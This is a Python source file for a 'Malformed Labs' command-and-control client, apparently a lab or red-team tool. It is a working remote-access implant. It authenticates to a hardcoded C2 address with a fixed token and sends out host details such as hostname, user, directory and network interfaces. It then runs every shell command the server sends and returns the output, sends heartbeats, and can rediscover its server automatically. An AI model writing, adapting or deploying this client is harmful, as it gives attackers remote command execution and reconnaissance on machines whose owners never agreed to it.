#!/usr/bin/env python3
"""
Malformed Labs Enhanced C2 Client
Consolidated Command and Control Client with Network Management
Features: Auto-discovery, Route management, Configuration handling
"""

import socket
import json
import time
import threading
import subprocess
import platform
import os
import sys
import re
from datetime import datetime
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class NetworkManager:
    """Handles network discovery, routing, and connectivity testing"""
    
    def __init__(self):
        self.system = platform.system().lower()
        self.primary_ip = self._get_primary_ip()
        
    def _get_primary_ip(self):
        """Get the primary IP address of this machine"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"
    
    def _run_command(self, command, timeout=10):
        """Execute system command safely"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return {
                'success': result.returncode == 0,
                'stdout': result.stdout.strip(),
                'stderr': result.stderr.strip(),
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'stdout': '',
                'stderr': 'Command timeout',
                'returncode': -1
            }
        except Exception as e:
            return {
                'success': False,
                'stdout': '',
                'stderr': str(e),
                'returncode': -1
            }
    
    def get_network_interfaces(self):
        """Get all network interfaces and their IPs"""
        interfaces = {}
        
        if self.system == 'linux':
            result = self._run_command("ip addr show")
            if result['success']:
                interfaces = self._parse_linux_interfaces(result['stdout'])
        elif self.system == 'darwin':  # macOS
            result = self._run_command("ifconfig")
            if result['success']:
                interfaces = self._parse_ifconfig_output(result['stdout'])
        elif self.system == 'windows':
            result = self._run_command("ipconfig")
            if result['success']:
                interfaces = self._parse_windows_interfaces(result['stdout'])
        
        return interfaces
    
    def _parse_linux_interfaces(self, output):
        """Parse Linux ip addr show output"""
        interfaces = {}
        current_interface = None
        
        for line in output.split('\n'):
            line = line.strip()
            
            if re.match(r'^\d+:', line):
                parts = line.split(':')
                if len(parts) >= 2:
                    current_interface = parts[1].strip()
                    interfaces[current_interface] = {
                        'ips': [],
                        'status': 'up' if 'UP' in line else 'down'
                    }
            
            elif 'inet ' in line and current_interface:
                ip_match = re.search(r'inet (\S+)', line)
                if ip_match:
                    ip = ip_match.group(1).split('/')[0]  # Remove CIDR
                    interfaces[current_interface]['ips'].append(ip)
        
        return interfaces
    
    def _parse_ifconfig_output(self, output):
        """Parse ifconfig output (macOS/Linux)"""
        interfaces = {}
        current_interface = None
        
        for line in output.split('\n'):
            if re.match(r'^[a-zA-Z0-9]+:', line) or re.match(r'^[a-zA-Z0-9]+\s', line):
                current_interface = line.split(':')[0].split()[0]
                interfaces[current_interface] = {
                    'ips': [],
                    'status': 'up' if 'UP' in line else 'down'
                }
            
            elif 'inet ' in line and current_interface:
                ip_match = re.search(r'inet (\S+)', line)
                if ip_match:
                    ip = ip_match.group(1)
                    interfaces[current_interface]['ips'].append(ip)
        
        return interfaces
    
    def _parse_windows_interfaces(self, output):
        """Parse Windows ipconfig output"""
        interfaces = {}
        current_interface = None
        
        for line in output.split('\n'):
            line = line.strip()
            
            if 'adapter' in line.lower():
                current_interface = line
                interfaces[current_interface] = {'ips': [], 'status': 'unknown'}
            
            elif ('IPv4 Address' in line or 'IP Address' in line) and current_interface:
                ip_match = re.search(r': (\S+)', line)
                if ip_match:
                    interfaces[current_interface]['ips'].append(ip_match.group(1))
        
        return interfaces
    
    def test_connectivity(self, host, port, timeout=5):
        """Test if we can connect to a host:port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def discover_c2_servers(self, port=8888):
        """Discover potential C2 server addresses"""
        candidates = []
        
        # Add primary IP
        candidates.append(self.primary_ip)
        
        # Get all interface IPs
        interfaces = self.get_network_interfaces()
        for interface_name, interface_info in interfaces.items():
            for ip in interface_info.get('ips', []):
                if ip not in candidates and not ip.startswith('127.'):
                    candidates.append(ip)
        
        # Add common variations
        if self.primary_ip:
            ip_parts = self.primary_ip.split('.')
            if len(ip_parts) == 4:
                # Add gateway (usually .1)
                gateway = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
                if gateway not in candidates:
                    candidates.append(gateway)
        
        # Add Docker common addresses
        docker_candidates = [
            "192.168.210.13",  # Your C2 container
            "172.17.0.1",      # Docker bridge
            "localhost",
            "127.0.0.1"
        ]
        
        for candidate in docker_candidates:
            if candidate not in candidates:
                candidates.append(candidate)
        
        # Test connectivity and return results
        results = []
        for host in candidates:
            reachable = self.test_connectivity(host, port)
            results.append({
                'host': host,
                'port': port,
                'reachable': reachable
            })
        
        return results
    
    def add_route(self, destination, gateway, interface=None):
        """Add a network route"""
        if self.system == 'linux':
            cmd = f"ip route add {destination} via {gateway}"
            if interface:
                cmd += f" dev {interface}"
        elif self.system == 'darwin':
            cmd = f"route add {destination} {gateway}"
            if interface:
                cmd += f" -interface {interface}"
        elif self.system == 'windows':
            cmd = f"route add {destination} {gateway}"
            if interface:
                cmd += f" if {interface}"
        else:
            return False, f"Unsupported OS: {self.system}"
        
        result = self._run_command(cmd)
        return result['success'], result['stderr'] if not result['success'] else "Route added"

class ConfigManager:
    """Handles configuration file operations"""
    
    def __init__(self, config_file='c2_config.json'):
        self.config_file = config_file
        self.config = self._load_config()
    
    def _load_config(self):
        """Load configuration from file"""
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            config_path = os.path.join(script_dir, self.config_file)
            
            if not os.path.exists(config_path):
                config_path = self.config_file
            
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.warning(f"Could not load config file: {e}")
        
        # Return default config
        return {
            'server': {
                'host': '192.168.210.13',
                'port': 8888
            },
            'client': {
                'auth_token': 'malformed_labs_c2_2024',
                'reconnect_interval': 30,
                'max_reconnect_attempts': 10
            }
        }
    
    def save_config(self):
        """Save current configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    def update_server(self, host, port=8888):
        """Update server configuration"""
        self.config['server']['host'] = host
        self.config['server']['port'] = port
        return self.save_config()
    
    def get_server_info(self):
        """Get server connection info"""
        return (
            self.config['server']['host'],
            self.config['server']['port']
        )

class C2Client:
    """Main C2 Client with enhanced networking capabilities"""
    
    def __init__(self, server_host=None, server_port=None, config_file='c2_config.json'):
        self.config_manager = ConfigManager(config_file)
        self.network_manager = NetworkManager()
        
        # Use provided parameters or config file
        if server_host and server_port:
            self.server_host = server_host
            self.server_port = server_port
        else:
            self.server_host, self.server_port = self.config_manager.get_server_info()
        
        self.socket = None
        self.running = False
        self.client_id = None
        self.auth_token = self.config_manager.config['client']['auth_token']
        self.client_info = self._get_system_info()
        
    def _get_system_info(self):
        """Gather comprehensive system information"""
        try:
            return {
                'hostname': platform.node(),
                'system': platform.system(),
                'release': platform.release(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor() or 'Unknown',
                'python_version': platform.python_version(),
                'user': os.getenv('USER') or os.getenv('USERNAME') or 'Unknown',
                'cwd': os.getcwd(),
                'primary_ip': self.network_manager.primary_ip,
                'interfaces': self.network_manager.get_network_interfaces()
            }
        except Exception as e:
            logger.error(f"Error gathering system info: {e}")
            return {'error': str(e)}
    
    def discover_and_connect(self):
        """Auto-discover C2 server and connect"""
        logger.info("Auto-discovering C2 servers...")
        
        results = self.network_manager.discover_c2_servers(self.server_port)
        reachable_servers = [r for r in results if r['reachable']]
        
        if reachable_servers:
            logger.info(f"Found {len(reachable_servers)} reachable servers:")
            for server in reachable_servers:
                logger.info(f"  - {server['host']}:{server['port']}")
            
            # Use the first reachable server
            best_server = reachable_servers[0]
            self.server_host = best_server['host']
            
            # Update config with discovered server
            self.config_manager.update_server(self.server_host, self.server_port)
            
            return self.connect()
        else:
            logger.error("No reachable C2 servers found")
            logger.info("Tested addresses:")
            for result in results:
                status = "[REACHABLE]" if result['reachable'] else "[NOT REACHABLE]"
                logger.info(f"  {status} {result['host']}:{result['port']}")
            return False
    
    def connect(self):
        """Establish connection to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            
            logger.info(f"Connecting to {self.server_host}:{self.server_port}")
            self.socket.connect((self.server_host, self.server_port))
            
            # Send authentication
            auth_data = {
                'type': 'auth',
                'token': self.auth_token,
                'client_info': self.client_info
            }
            
            self._send_data(auth_data)
            
            # Wait for auth response
            response = self._receive_data()
            if response and response.get('type') == 'auth_success':
                self.client_id = response.get('client_id')
                logger.info(f"Authentication successful. Client ID: {self.client_id}")
                return True
            else:
                logger.error("Authentication failed")
                return False
                
        except socket.timeout:
            logger.error("Connection timeout")
            return False
        except ConnectionRefusedError:
            logger.error("Connection refused")
            return False
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False
    
    def _send_data(self, data):
        """Send JSON data to server"""
        try:
            json_data = json.dumps(data)
            message = json_data.encode('utf-8')
            message_length = len(message)
            
            self.socket.sendall(message_length.to_bytes(4, byteorder='big'))
            self.socket.sendall(message)
            
        except Exception as e:
            logger.error(f"Error sending data: {e}")
            raise
    
    def _receive_data(self):
        """Receive JSON data from server"""
        try:
            # Get message length
            length_bytes = b''
            while len(length_bytes) < 4:
                chunk = self.socket.recv(4 - len(length_bytes))
                if not chunk:
                    return None
                length_bytes += chunk
            
            message_length = int.from_bytes(length_bytes, byteorder='big')
            
            # Get message
            message = b''
            while len(message) < message_length:
                chunk = self.socket.recv(message_length - len(message))
                if not chunk:
                    return None
                message += chunk
            
            return json.loads(message.decode('utf-8'))
            
        except Exception as e:
            logger.error(f"Error receiving data: {e}")
            return None
    
    def _execute_command(self, command):
        """Execute system command"""
        try:
            logger.info(f"Executing: {command}")
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'command': command
            }
            
        except subprocess.TimeoutExpired:
            return {
                'stdout': '',
                'stderr': 'Command timeout (30s)',
                'returncode': -1,
                'command': command
            }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'returncode': -1,
                'command': command
            }
    
    def _handle_server_commands(self):
        """Handle incoming commands from server"""
        while self.running:
            try:
                data = self._receive_data()
                if not data:
                    break
                
                command_type = data.get('type')
                
                if command_type == 'command':
                    command = data.get('command', '')
                    command_id = data.get('command_id', 'unknown')
                    
                    result = self._execute_command(command)
                    
                    response = {
                        'type': 'command_result',
                        'command_id': command_id,
                        'client_id': self.client_id,
                        'result': result,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self._send_data(response)
                    
                elif command_type == 'ping':
                    pong = {
                        'type': 'pong',
                        'client_id': self.client_id,
                        'timestamp': datetime.now().isoformat()
                    }
                    self._send_data(pong)
                    
                elif command_type == 'disconnect':
                    logger.info("Server requested disconnect")
                    break
                    
            except Exception as e:
                logger.error(f"Error handling command: {e}")
                break
    
    def _send_heartbeat(self):
        """Send periodic heartbeat"""
        while self.running:
            try:
                heartbeat = {
                    'type': 'heartbeat',
                    'client_id': self.client_id,
                    'timestamp': datetime.now().isoformat(),
                    'status': 'alive'
                }
                self._send_data(heartbeat)
                time.sleep(30)
                
            except Exception as e:
                logger.error(f"Heartbeat error: {e}")
                break
    
    def run(self):
        """Main client execution loop"""
        # Try to connect directly first
        if not self.connect():
            # If direct connection fails, try auto-discovery
            if not self.discover_and_connect():
                return False
        
        self.running = True
        
        # Start background threads
        heartbeat_thread = threading.Thread(target=self._send_heartbeat, daemon=True)
        command_thread = threading.Thread(target=self._handle_server_commands, daemon=True)
        
        heartbeat_thread.start()
        command_thread.start()
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
        
        return True
    
    def stop(self):
        """Stop the client gracefully"""
        self.running = False
        if self.socket:
            try:
                disconnect_msg = {
                    'type': 'disconnect',
                    'client_id': self.client_id,
                    'timestamp': datetime.now().isoformat()
                }
                self._send_data(disconnect_msg)
            except:
                pass
            
            self.socket.close()
        logger.info("Client stopped")

def print_usage():
    """Print usage information"""
    print("=== Enhanced C2 Client ===")
    print("Usage:")
    print("  python3 c2client_enhanced.py                          # Auto-discovery mode")
    print("  python3 c2client_enhanced.py <host> <port>           # Direct connection")
    print("  python3 c2client_enhanced.py --discover              # Discovery only")
    print("  python3 c2client_enhanced.py --config <host> <port>  # Update config")
    print("  python3 c2client_enhanced.py --network               # Show network info")
    print("  python3 c2client_enhanced.py --route <dest> <gw>     # Add route")

def main():
    """Main function with command line handling"""
    
    if len(sys.argv) > 1 and sys.argv[1] in ['--help', '-h']:
        print_usage()
        return
    
    # Handle special modes
    if len(sys.argv) > 1:
        if sys.argv[1] == '--discover':
            print("=== C2 Server Discovery ===")
            nm = NetworkManager()
            results = nm.discover_c2_servers(8888)
            
            print("Discovery results:")
            for result in results:
                status = "[REACHABLE]" if result['reachable'] else "[NOT REACHABLE]"
                print(f"  {result['host']}:{result['port']} - {status}")
            return
            
        elif sys.argv[1] == '--network':
            print("=== Network Information ===")
            nm = NetworkManager()
            print(f"Primary IP: {nm.primary_ip}")
            print(f"System: {nm.system}")
            
            interfaces = nm.get_network_interfaces()
            print("\nInterfaces:")
            for name, info in interfaces.items():
                print(f"  {name}: {info}")
            return
            
        elif sys.argv[1] == '--config' and len(sys.argv) >= 4:
            host = sys.argv[2]
            port = int(sys.argv[3])
            
            cm = ConfigManager()
            if cm.update_server(host, port):
                print(f"[SUCCESS] Config updated: {host}:{port}")
            else:
                print("[ERROR] Failed to update config")
            return
            
        elif sys.argv[1] == '--route' and len(sys.argv) >= 4:
            dest = sys.argv[2]
            gateway = sys.argv[3]
            
            nm = NetworkManager()
            success, message = nm.add_route(dest, gateway)
            
            if success:
                print(f"[SUCCESS] Route added: {dest} via {gateway}")
            else:
                print(f"[ERROR] Failed to add route: {message}")
            return
    
    # Regular client operation
    print("=== Malformed Labs Enhanced C2 Client ===")
    
    # Determine connection parameters
    if len(sys.argv) >= 3:
        server_host = sys.argv[1]
        server_port = int(sys.argv[2])
        print(f"Direct connection mode: {server_host}:{server_port}")
        client = C2Client(server_host, server_port)
    else:
        print("Auto-discovery mode")
        client = C2Client()
    
    print("Press Ctrl+C to stop\n")
    
    try:
        client.run()
    except KeyboardInterrupt:
        print("\nShutting down...")
        client.stop()
    
    print("Client shutdown complete.")

if __name__ == "__main__":
    main()